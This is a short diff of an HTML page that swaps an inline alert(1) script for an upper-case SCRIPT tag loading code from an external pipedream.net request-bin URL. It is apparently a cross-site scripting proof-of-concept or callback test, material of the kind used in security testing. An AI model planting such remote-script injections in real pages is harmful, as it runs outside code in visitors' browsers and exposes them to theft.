@@ -2,7 +2,7 @@
   <header>
   </header>
   <body>		
-     <script>alert(1)</script>
+     <SCRIPT SRC=https://enteje1fmvxh.x.pipedream.net>alert(1)</SCRIPT>
   </body>
 <html>
 
